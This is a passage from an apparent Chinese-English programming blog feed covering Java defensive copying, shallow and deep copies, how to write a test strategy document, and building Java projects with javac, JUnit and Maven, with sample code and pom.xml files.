class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Planet is an immutable class, since there is no way to change</span></span><br><span class="line"><span class="comment">* its state after construction.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Planet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Planet</span> <span class="params">(<span class="keyword">double</span> mass, String name, Date dateOfDiscovery)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">this</span>.mass = mass;</span><br><span class="line">     <span class="keyword">this</span>.name = name;</span><br><span class="line">     <span class="comment">//make a private copy of aDateOfDiscovery</span></span><br><span class="line">     <span class="comment">//this is the only way to keep the fDateOfDiscovery</span></span><br><span class="line">     <span class="comment">//field private, and shields this class from any changes that </span></span><br><span class="line">     <span class="comment">//the caller may make to the original aDateOfDiscovery object</span></span><br><span class="line">     <span class="keyword">this</span>.dateOfDiscovery = <span class="keyword">new</span> Date(dateOfDiscovery.getTime());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a primitive value.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * The caller can do whatever they want with the return value, without </span></span><br><span class="line"><span class="comment">  * affecting the internals of this class. Why? Because this is a primitive </span></span><br><span class="line"><span class="comment">  * value. The caller sees its &quot;own&quot; double that simply has the</span></span><br><span class="line"><span class="comment">  * same value as fMass.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getMass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mass;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns an immutable object.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * The caller gets a direct reference to the internal field. But this is not </span></span><br><span class="line"><span class="comment">  * dangerous, since String is immutable and cannot be changed.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  /**</span></span><br><span class="line"><span class="comment">//  * Returns a mutable object - likely bad style.</span></span><br><span class="line"><span class="comment">//  *</span></span><br><span class="line"><span class="comment">//  * The caller gets a direct reference to the internal field. This is usually dangerous, </span></span><br><span class="line"><span class="comment">//  * since the Date object state can be changed both by this class and its caller.</span></span><br><span class="line"><span class="comment">//  * That is, this class is no longer in complete control of dateOfDiscovery.</span></span><br><span class="line"><span class="comment">//  */</span></span><br><span class="line"><span class="comment">//  public Date getDateOfDiscovery() &#123;</span></span><br><span class="line"><span class="comment">//    return dateOfDiscovery;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a mutable object - good style.</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * Returns a defensive copy of the field.</span></span><br><span class="line"><span class="comment">  * The caller of this method can do anything they want with the</span></span><br><span class="line"><span class="comment">  * returned Date object, without affecting the internals of this</span></span><br><span class="line"><span class="comment">  * class in any way. Why? Because they do not have a reference to </span></span><br><span class="line"><span class="comment">  * fDate. Rather, they are playing with a second Date that initially has the </span></span><br><span class="line"><span class="comment">  * same data as fDate.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Date <span class="title">getDateOfDiscovery</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Date(dateOfDiscovery.getTime());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PRIVATE</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Final primitive data is always immutable.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">double</span> mass;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * An immutable object field. (String objects never change state.)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * A mutable object field. In this case, the state of this mutable field</span></span><br><span class="line"><span class="comment">  * is to be changed only by this class. (In other cases, it makes perfect</span></span><br><span class="line"><span class="comment">  * sense to allow the state of a field to be changed outside the native</span></span><br><span class="line"><span class="comment">  * class; this is the case when a field acts as a &quot;pointer&quot; to an object</span></span><br><span class="line"><span class="comment">  * created elsewhere.)</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * java.util.Date is used here only because its convenient for illustrating </span></span><br><span class="line"><span class="comment">  * a point about mutable objects. In new code, you should use </span></span><br><span class="line"><span class="comment">  * java.time classes, not java.util.Date.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> Date dateOfDiscovery;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="关于深浅拷贝的解释"><a href="#关于深浅拷贝的解释" class="headerlink" title="关于深浅拷贝的解释"></a>关于深浅拷贝的解释</h1><h3 id="Shallow-copy"><a href="#Shallow-copy" class="headerlink" title="Shallow copy"></a>Shallow copy</h3><p>One method of copying an object is the <em>shallow copy</em>. In that case a new object B is <a href="https://www.wikiwand.com/en/Object_creation">created</a>, and the fields values of A are copied over to B. This is also known as a <em>field-by-field copy</em>, <em>field-for-field copy</em>, or <em>field copy</em>. If the field value is a reference to an object (e.g., a memory address) it copies the reference, hence referring to the same object as A does, and if the field value is a primitive type it copies the value of the primitive type. In languages without primitive types (where everything is an object), all fields of the copy B are references to the same objects as the fields of original A. The referenced objects are thus <em>shared</em>, so if one of these objects is modified (from A or B), the change is visible in the other. Shallow copies are simple and typically cheap, as they can be usually implemented by simply copying the bits exactly.</p><h3 id="Deep-copy"><a href="#Deep-copy" class="headerlink" title="Deep copy"></a>Deep copy</h3><p>A deep copy in progress.</p><p><img src="/2021/how-to-implement-with-defensive-copying/400px-Deep_copy_in_progress.svg.png" alt="img"></p><p>A deep copy having been completed.</p><p><img src="/2021/how-to-implement-with-defensive-copying/400px-Deep_copy_done.svg.png" alt="img"></p><p>An alternative is a deep copy, meaning that fields are dereferenced: rather than references to objects being copied, new copy objects are created for any referenced objects, and references to these placed in B. The result is different from the result a shallow copy gives in that the objects referenced by the copy B are distinct from those referenced by A, and independent. Deep copies are more expensive, due to needing to create additional objects, and can be substantially more complicated, due to references possibly forming a complicated graph.</p><p>Deep copy is a process in which the copying process occurs recursively. It means first constructing a new collection object and then recursively populating it with copies of the child objects found in the original. In case of deep copy, a copy of object is copied in other object. It means that any changes made to a copy of object do not reflect in the original object. In python, this is implemented using “deep copy()” function.</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>传递引用要谨慎，若该类中的某个字段是mutable类型，但需求为不能更改，那么应该在字段前加上final修饰，且在构造器和getter、setter中传送的应该是该字段的拷贝。</p><p>Defensive copying helps encapsulation as it mitigates escape of fields through the getters methods. Defensive copying creates a copy every time and thus you can end up with too many copying of something. This can strain the memory management (the garbage collector) and can have a negative effects on the whole application performance. With that said, it is quite effective and simple to implement. Prevention is better than cure, but in cases where we cannot change the types, defensive copying can step in and save the day.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;defensive copying(保护性拷贝)是在软件实现中常会用到的概念，这篇博客主要介绍为什么需要 defensive copy 和如何实现 defensive copying。&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>how to write Test Strategy document</title>
    <link href="https://www.fvolcano.red/2021/how-to-write-test-strategy-document/"/>
    <id>https://www.fvolcano.red/2021/how-to-write-test-strategy-document/</id>
    <published>2021-05-27T13:59:15.000Z</published>
    <updated>2021-05-27T13:59:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>Test strategy means “How you are going to test the application”. It deals with test objectives, approach, test environment, automation strategy and tools, and risk analysis with a contingency plan.</p><a id="more"></a><p>参考资料：</p><ol><li><a href="https://www.softwaretestinghelp.com/writing-test-strategy-document-template/#:~:text=%20Simple%20Tips%20To%20Write%20Test%20Strategy%20Document,project.%20Clearly%2C%20mention%20what%20types%20of...%20More">How To Write Test Strategy Document (With Sample Test Strategy Template)</a></li><li><a href="http://tryqa.com/what-is-test-strategy-types-of-strategies-with-examples/">What is Test Strategy? Types of strategies with examples</a></li><li><a href="https://testfort.com/blog/7-steps-to-develop-good-test-strategy-document">7 Steps to Develop Good Test Strategy Document</a></li><li><a href="https://www.softwaretestinghelp.com/how-to-write-test-plan-document-software-testing-training-day3/">Test Plan Tutorial: A Guide To Write A Software Test Plan Document From Scratch</a></li></ol><h1 id="What"><a href="#What" class="headerlink" title="What"></a>What</h1><p>Test strategy means “How you are going to test the application?” You need to mention the exact process/strategy that you are going to follow when you will get the application for testing.</p><p>test strategy defines guidelines for test approach to be followed in order to achieve the test objectives and execution of test types defined in the testing plan. It deals with test objectives, approach, test environment, automation strategy and tools, and risk analysis with a contingency plan.</p><h1 id="How"><a href="#How" class="headerlink" title="How"></a>How</h1><h2 id="Sections-of-test-strategy-document"><a href="#Sections-of-test-strategy-document" class="headerlink" title="Sections of test strategy document"></a>Sections of test strategy document</h2><ol><li><strong>Scope and overview</strong><br>This stage is fundamental as it shapes testing company’s vision. It includes:<ul><li>dividing roles and responsibilities, deciding who should approve, review and use this document;</li><li>defining phases of each project according to the timelines that are specified in the test plan.</li></ul></li><li><strong>Test Approach</strong><br>This step should be well-thought to avoid further mess in case something goes wrong. The main points to be considered at this stage are:<ul><li>testing process and life cycle;</li><li>distribution of responsibilities among the team of QA engineers;</li><li>defining all testing types that company can provide the client with;</li><li>establishing testing approaches.</li></ul></li><li><strong>Test environment</strong><br>This stage of Test Strategy document has to cover the next aspects regarding test data:<ul><li>requirements – the clear instruction on how to create test data;</li><li>environments and all required setups for each of them;</li><li>backup and restore strategy to make sure you won’t lose any data due to some unexpected code issues.</li></ul></li><li><strong>Testing tools</strong><br>At this point you need to choose all the tools that will be used for test execution. All commercial, open source, automation and management tools have to be listed here.</li><li><strong>Realese</strong><br>To ensure successful test execution, make sure your release management plan is created thoughtfully. Thus, set a build management process to know where new build should be available, when it’s going to be deployed, who should deploy it, how to stop release in case of issues, etc.</li><li><strong>Industry standards to follow</strong></li><li><strong>Test deliverables</strong></li><li><strong>Testing metrics</strong></li><li><strong>Requirement Traceability Matrix</strong></li><li><strong>Risk and mitigation</strong><br>Try to foresee all possible risks related to your project. Write a clear plan to avoid such risks and a contingency plan in case these risks become a reality.</li><li><strong>Reporting tool</strong></li><li><strong>Test summary</strong><br>The ready plan must be reviewed and approved by managers, technical team leaders, business development, and software development teams. Also Test Strategy document can be updated in case some important changes occur in the course of the testing process.</li></ol><h2 id="Simple-Tips-To-Write-Test-Strategy-Document"><a href="#Simple-Tips-To-Write-Test-Strategy-Document" class="headerlink" title="Simple Tips To Write Test Strategy Document"></a>Simple Tips To Write Test Strategy Document</h2><ol><li>Include product background in the test strategy document. In the first paragraph of your test strategy document answer – Why stakeholders want to develop this project? This will help to understand and prioritize things quickly.</li><li>List all important features you are going to test. If you think some features are not part of this release then mention those features under “Features not to be tested” label.</li><li>Write down the test approach for your project. Clearly, mention what types of testing you are going to conduct?<br>i.e. Functional testing, UI testing, Integration testing, Load/Stress testing, Security testing, etc.</li><li>Answer questions like how you are going to perform functional testing? Manual or automation testing? Are you going to execute all test cases from your test management tool?</li><li>Which bug tracking tool you are going to use? What will be the process when you will find a new bug?</li><li>What are your test entry and exit criteria?</li><li>How will you track your testing progress? What metrics are you going to use for tracking test completion?</li><li>Task distribution – Define the roles and responsibilities of each team member.</li><li>What documents will you produce during and after the testing phase?</li><li>What risks do you see in Test completion?</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Test strategy means “How you are going to test the application”. It deals with test objectives, approach, test environment, automation strategy and tools, and risk analysis with a contingency plan.&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>如何build一个Java项目（Maven、Gradle、JDK、Ant、Travis-CI）</title>
    <link href="https://www.fvolcano.red/2021/how-to-build-a-java-project/"/>
    <id>https://www.fvolcano.red/2021/how-to-build-a-java-project/</id>
    <published>2021-05-22T23:38:11.000Z</published>
    <updated>2021-05-22T23:38:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>脱离IDE，本地（Maven、Gradle、JDK、Ant）/在线（Travis-CI）build Java项目的步骤。<a id="more"></a></p><h1 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h1><ol><li><a href="https://www.dummies.com/programming/java/how-to-use-the-javac-command/">How to Use the javac Command</a></li><li><a href="https://www.softwaretestinghelp.com/multiple-ways-to-execute-junit-tests/">Multiple Ways To Execute JUnit Tests</a></li><li><a href="https://www.lambdatest.com/blog/run-junit-from-command-line/">How To Run Junit Tests From The Command Line</a></li></ol><h2 id="编译运行Java文件"><a href="#编译运行Java文件" class="headerlink" title="编译运行Java文件"></a>编译运行Java文件</h2><ul><li><p>If the Java file you specify on the command line contains a reference to another Java class that’s defined by a java file in the same folder, the Java compiler automatically compiles that class, too.</p></li><li><p>You can list more than one filename in the javac command.</p></li><li><p>You can use a wildcard to compile all the files in a folder, like this:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javac</span> <span class="regexp">*.java</span></span><br></pre></td></tr></table></figure></li></ul><ol><li>javac MagicSquare.java</li></ol><p>错误: 找不到或无法加载主类 MagicSquare</p><p>原因: java 源文件中带有包名。</p><p>解决方案: javac 后加上完整包名，这需要退回到适当的目录：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">javac P1/MagicSquare.java</span><br></pre></td></tr></table></figure><ol start="2"><li>java P1.MagicSquare</li></ol><h2 id="运行Junit-Test-Case"><a href="#运行Junit-Test-Case" class="headerlink" title="运行Junit Test Case"></a>运行Junit Test Case</h2><ol><li>编译：javac -cp “junit-4.12.jar;.”  [P2/][JUnitProgramTest].java，还有依赖的其他外部库也要带上，用分号隔开。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Result result = JUnitCore.runClasses(JUnitProgramTest.class);</span><br><span class="line">    <span class="keyword">for</span> (Failure fail : result.getFailures()) &#123;</span><br><span class="line">        System.out.println(fail.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result.wasSuccessful()) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;All tests finished successfully...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>The dot implies that:</strong></p><ul><li><p>The classpath already includes the current directory for the Java source files.</p></li><li><p>The JVM (Java Virtual Machine) automatically assumes that the current directory is where the source files are placed.</p></li><li><p>JVM then searches for the mentioned JUnit file name there. The filename is the last parameter given in the compile command.</p></li></ul><ol start="2"><li>运行：java -cp “junit-4.12.jar;.” org.junit.runner.JUnitCore [P2/][JUnitProgramTest]</li></ol><h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><p><a href="https://spring.io/guides/gs/maven/">Building Java Projects with Maven</a></p><ol><li>安装JDK和Maven，都添加到环境变量path。</li><li>在项目根目录中添加pom.xml</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mycompany.app<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>my-app<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 外部库依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>mvn package</li></ol><p><img src="/2021/how-to-build-a-java-project/image-20210523085814285.png" alt="image-20210523085814285"></p><ol start="4"><li><p>java -cp target/lab1-1.0.jar P1.MagicSquare</p><p><img src="/2021/how-to-build-a-java-project/image-20210523095825922.png" alt="image-20210523095825922"></p></li></ol><p>Standard project structure:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span>-app</span><br><span class="line">|<span class="comment">-- pom.xml</span></span><br><span class="line">`<span class="comment">-- src</span></span><br><span class="line">    |<span class="comment">-- main</span></span><br><span class="line">    |   `<span class="comment">-- java</span></span><br><span class="line">    |       `<span class="comment">-- com</span></span><br><span class="line">    |           `<span class="comment">-- mycompany</span></span><br><span class="line">    |               `<span class="comment">-- app</span></span><br><span class="line">    |                   `<span class="comment">-- App.java</span></span><br><span class="line">    `<span class="comment">-- test</span></span><br><span class="line">        `<span class="comment">-- java</span></span><br><span class="line">            `<span class="comment">-- com</span></span><br><span class="line">                `<span class="comment">-- mycompany</span></span><br><span class="line">                    `<span class="comment">-- app</span></span><br><span class="line">                        `<span class="comment">-- AppTest.java</span></span><br></pre></td></tr></table></figure><p>若不使用这样的文件结构，需要在pom.xml文件中指明src和test目录位置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>Lab1-1190200215<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Lab1<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">name</span>&gt;</span>Lab1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">testSourceDirectory</span>&gt;</span>test<span class="tag">&lt;/<span class="name">testSourceDirectory</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;<span class="name">directory</span>&gt;</span>src<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">truetruetruetruetrue<span class="tag">&lt;<span class="name">exclude</span>&gt;</span>**/*.java<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">truetruetruetrue    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">truetruetruetruetrue<span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">truetruetruetruetrue<span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">truetruetruetrue<span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">truetruetrue<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">             UTF-8</span><br><span class="line">         <span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>附：POM 标签大全详解</p><h1 